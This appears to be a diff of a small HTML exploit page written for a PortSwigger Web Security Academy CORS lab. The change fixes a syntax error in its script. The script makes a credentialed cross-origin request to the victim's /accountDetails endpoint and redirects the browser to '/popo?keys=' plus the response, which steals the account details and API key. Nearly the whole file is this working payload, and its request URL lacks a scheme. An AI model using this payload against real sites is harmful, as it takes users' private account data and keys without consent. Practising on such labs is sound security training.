@@ -1,19 +1,22 @@
-<html>
-  <head>
-    <title>
-      
-    </title>
-  </head>
-  <body>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>hello </h1>
     <script>
-      const request = new XMLHttpRequest()
-      request.open('get,"0af7003203820d368122348900da003f.web-security-academy.net/accountDetails",true)
-      request.onload = ()=> {
-        window.location.href = "/popo?key= " + request.responseText
-
-
-      request.withCredentials = true
-      request.send()
+        const request = new XMLHttpRequest()
+        request.open("get","0af7003203820d368122348900da003f.web-security-academy.net/accountDetails",true)
+        request.onload = ()=>{
+            window.location.href = "/popo?keys= " + request.responseText
+        }
+        request.withCredentials = true
+        request.send()
     </script>
-  </body>
+    
+</body>
 </html>
